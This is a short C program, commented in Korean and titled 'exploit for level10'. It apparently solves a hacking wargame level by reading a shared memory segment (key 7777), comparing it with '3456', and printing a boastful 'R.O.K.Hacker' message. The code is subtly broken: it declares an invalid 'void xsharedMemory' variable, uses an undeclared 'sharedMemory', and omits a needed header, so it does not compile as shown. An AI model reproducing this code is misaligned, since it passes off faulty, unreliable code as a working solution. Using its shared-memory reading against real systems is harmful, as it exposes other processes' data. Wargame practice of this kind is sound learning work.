/*
 * Author : superdk@hanmail.net
 * DATA : exploit for level10
 * LICENSE : GNU License
 */

#include <stdio.h>
#include <sys/shm.h>
#include <sys/types.h>

#define BUFFSIZE 1024

int main( )
{
	void xsharedMemory = (void *)0;
	int sharedMemID;
	char buf[BUFFSIZE];
	key_t keyval = 7777;
	
	/* 생성되어 있는 공유 메모리의 ID를 읽어온다 */
	sharedMemID = shmget(keyval, BUFFSIZE, 0666);
	
	/* 프로세스에서 공유 메모리 공간을 사용할 수 있게 연결(Attach)한다 */
	sharedMemory = shmat(sharedMemID, (void *)0, 0);
	
	/* 공유 메모리 공간에 있는 값을 특정 변수에 복사한다 */
	memcpy(buf, sharedMemory, BUFFSIZE);
	if(strcmp(buf, "3456") == 0)
		printf("key is %s\nI am superdk as R.O.K.Hacker!!!\n", buf);
	else
		printf("key is wrong!!!\n");
	
	/* 프로세스에서 공유 메모리의 연결을 분리(Detach)한다 */
	shmdt(sharedMemory);
	
	return 0;
}